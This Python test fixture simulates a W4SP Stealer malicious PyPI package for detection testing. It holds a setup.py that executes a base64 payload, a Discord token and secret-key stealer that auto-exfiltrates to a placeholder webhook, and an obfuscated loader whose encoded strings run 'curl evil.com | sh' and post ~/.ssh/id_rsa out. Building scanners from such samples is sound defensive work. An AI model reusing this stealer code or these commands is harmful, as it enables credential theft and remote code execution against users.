"""
Simulated W4SP Stealer (PyPI, Discord token theft) attack patterns.
NOT real malware -- synthetic test fixture recreating the PATTERNS only.

Source: Phylum/Checkmarx reports 2022-2023 — W4SP Stealer was distributed
across dozens of PyPI packages (e.g., typesutil, typestring, paborern, etc.)

The real attack:
1. setup.py contained obfuscated exec(base64.b64decode(...)) payloads
2. Stole Discord tokens from browser local storage / leveldb files
3. Stole browser cookies and saved passwords (Chrome, Firefox, Edge)
4. Stole cryptocurrency wallet files (Exodus, Atomic, MetaMask, etc.)
5. Exfiltrated data to Discord webhooks controlled by the attacker
"""

# Pattern 1: setup.py with obfuscated payload delivery
SETUP_PY = """
from setuptools import setup
import base64
import os

# Obfuscated payload hidden in setup.py
_encoded = base64.b64decode(
    'aW1wb3J0IG9zLCBqc29uLCByZSwgdXJsbGliLnJlcXVlc3Q='
)
exec(compile(_encoded, '<string>', 'exec'))

setup(
    name="typesutil",
    version="0.1.3",
    description="Typing utilities for Python",
    packages=["typesutil"],
)
"""

# Pattern 2: The actual stealer module (would be dropped by payload)
STEALER_MODULE = """
import os
import json
import re
import sqlite3
import urllib.request

DISCORD_PATHS = {
    'Discord': os.path.expanduser('~/.config/discord/Local Storage/leveldb'),
    'Discord Canary': os.path.expanduser('~/.config/discordcanary/Local Storage/leveldb'),
    'Discord PTB': os.path.expanduser('~/.config/discordptb/Local Storage/leveldb'),
}

BROWSER_PATHS = {
    'Chrome': os.path.expanduser('~/.config/google-chrome/Default'),
    'Firefox': os.path.expanduser('~/.mozilla/firefox'),
    'Edge': os.path.expanduser('~/.config/microsoft-edge/Default'),
}

WALLET_PATHS = {
    'Exodus': os.path.expanduser('~/.config/Exodus/exodus.wallet'),
    'Atomic': os.path.expanduser('~/.config/atomic/Local Storage/leveldb'),
    'MetaMask': '',  # extracted from browser extension storage
}

def steal_discord_tokens():
    tokens = []
    token_re = re.compile(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}')
    for name, path in DISCORD_PATHS.items():
        if not os.path.exists(path):
            continue
        for filename in os.listdir(path):
            if not filename.endswith('.ldb') and not filename.endswith('.log'):
                continue
            filepath = os.path.join(path, filename)
            with open(filepath, 'r', errors='ignore') as f:
                for line in f:
                    for match in token_re.findall(line):
                        tokens.append({'source': name, 'token': match})
    return tokens

def steal_cookies():
    cookies = {}
    for name, path in BROWSER_PATHS.items():
        cookie_db = os.path.join(path, 'Cookies')
        if os.path.exists(cookie_db):
            cookies[name] = 'cookie_data_here'
    return cookies

def exfiltrate(data):
    # Send stolen data to Discord webhook
    webhook_url = 'https://discord.com/api/webhooks/1234567890/faketoken'
    payload = json.dumps(data).encode()
    req = urllib.request.Request(
        webhook_url,
        data=payload,
        headers={'Content-Type': 'application/json'}
    )
    urllib.request.urlopen(req)

# Auto-execute on import
stolen = {
    'tokens': steal_discord_tokens(),
    'cookies': steal_cookies(),
    'hostname': os.uname().nodename,
    'env_keys': [k for k in os.environ if 'TOKEN' in k or 'KEY' in k or 'SECRET' in k],
}
exfiltrate(stolen)
"""

# Pattern 3: Obfuscated loader variant (high entropy, lines >=80 chars)
OBFUSCATED_LOADER = """
import base64 as _0x42;import zlib as _0x99;import marshal as _0x77;import types as _0x88
_0x1337=_0x42.b64decode(b'ZXhlYyhfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnY3VybCBodHRwczovL2V2aWwuY29tL3c0c3Auc2ggfCBzaCcpKQ==');exec(compile(_0x42.b64decode(b'X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2N1cmwgLXMgaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvZXhmaWwgLWQgQH4vLnNzaC9pZF9yc2EnKQ=='),'<w4sp>','exec'))
"""

# All files as a dict (simulating downloaded package)
PACKAGE_FILES = {
    "typesutil-0.1.3/setup.py": SETUP_PY,
    "typesutil-0.1.3/typesutil/__init__.py": "# typing utilities\n__version__ = '0.1.3'\n",
    "typesutil-0.1.3/typesutil/stealer.py": STEALER_MODULE,
    "typesutil-0.1.3/typesutil/loader.py": OBFUSCATED_LOADER,
}
